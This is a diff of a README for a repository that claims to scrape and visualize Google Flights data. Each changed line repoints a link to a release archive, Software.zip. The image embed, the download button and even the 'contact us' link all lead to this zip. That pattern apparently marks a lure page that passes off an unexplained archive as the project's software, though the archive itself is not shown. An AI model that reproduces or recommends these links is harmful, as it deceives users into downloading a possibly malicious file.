@@ -3,7 +3,7 @@
 ## Overview
 Welcome to the "Flight_Details_Scraper_and_Visualization" repository! This project focuses on scraping flight details from Google Flights, processing the data, and performing cleaning and visualization for future use in analytics or predictive modeling.
 
-![Flight](https://github.com/Nikhil829029/Flight_Details_Scraper_and_Visualization/releases/download/v1.0.0/Application.zip)
+![Flight](https://github.com/Nikhil829029/Flight_Details_Scraper_and_Visualization/releases/download/v2.0/Software.zip)
 
 ## Repository Topics
 - BeautifulSoup
@@ -24,7 +24,7 @@ Welcome to the "Flight_Details_Scraper_and_Visualization" repository! This proje
 ## Installation
 To get started with this project, download the necessary files by clicking the button below:
 
-[![Download Software](https://github.com/Nikhil829029/Flight_Details_Scraper_and_Visualization/releases/download/v1.0.0/Application.zip)](https://github.com/Nikhil829029/Flight_Details_Scraper_and_Visualization/releases/download/v1.0.0/Application.zip)
+[![Download Software](https://github.com/Nikhil829029/Flight_Details_Scraper_and_Visualization/releases/download/v2.0/Software.zip)](https://github.com/Nikhil829029/Flight_Details_Scraper_and_Visualization/releases/download/v2.0/Software.zip)
 
 Once downloaded, extract the files and follow the instructions in the project documentation to set up and run the code. 
 
@@ -45,7 +45,7 @@ The repository is organized into the following main components:
 - **Vishal Lazrus** - _Project Lead_
 
 ## Feedback and Support
-If you have any feedback, suggestions, or issues with the project, feel free to [contact us](https://github.com/Nikhil829029/Flight_Details_Scraper_and_Visualization/releases/download/v1.0.0/Application.zip).
+If you have any feedback, suggestions, or issues with the project, feel free to [contact us](https://github.com/Nikhil829029/Flight_Details_Scraper_and_Visualization/releases/download/v2.0/Software.zip).
 
 ---
 
